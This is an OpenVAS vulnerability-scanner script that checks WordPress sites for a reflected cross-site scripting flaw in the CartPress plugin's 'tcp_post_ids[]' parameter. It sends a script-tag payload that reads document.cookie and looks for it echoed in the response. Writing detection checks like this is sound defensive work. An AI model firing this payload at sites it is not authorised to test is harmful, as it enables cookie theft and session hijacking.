###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_cartpress_plugin_xss_vuln.nasl 3508 2016-06-14 06:49:53Z ckuerste $
#
# WordPress CartPress Plugin 'tcp_post_ids' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to execute
arbitrary web script or HTML in a user's browser session in the context of an
affected site.

Impact Level: Application";

tag_affected = "WordPress CartPress Plugin version 1.1.6 and prior.";

tag_insight = "The flaw is due to an input validation error in the 'tcp_post_ids[]'
parameter in '/wp-content/plugins/thecartpress/admin/OptionsPostsList.php'
when processing user-supplied data.";

tag_solution = "Upgrade to WordPress CartPress Plugin 1.1.7 or higher,
For updates refer to http://wordpress.org/extend/plugins/thecartpress/download/";

tag_summary = "This host is installed with WordPress CartPress plugin and is
prone to cross-site scripting vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802554";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 3508 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-06-14 08:49:53 +0200 (Tue, 14 Jun 2016) $");
  script_tag(name:"creation_date", value:"2012-01-04 13:54:24 +0530 (Wed, 04 Jan 2012)");
  script_name("WordPress CartPress Plugin 'tcp_post_ids' Parameter Cross Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108272/wpcartpress-xss.txt");

  script_summary("Check if WordPress CartPress plugin is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Construct the Attack Request
url = dir + '/wp-content/plugins/thecartpress/admin/OptionsPostsList.php?' +
            'tcp_options_posts_update=&tcp_post_ids[]=<script>alert' +
            '(document.cookie);</script>';

## Try attack and check the response to confirm vulnerability.
if(http_vuln_check(port:port, url:url, pattern:"<script>alert\(document." +
                               "cookie\);</script>", check_header:TRUE)){
  security_message(port);
}
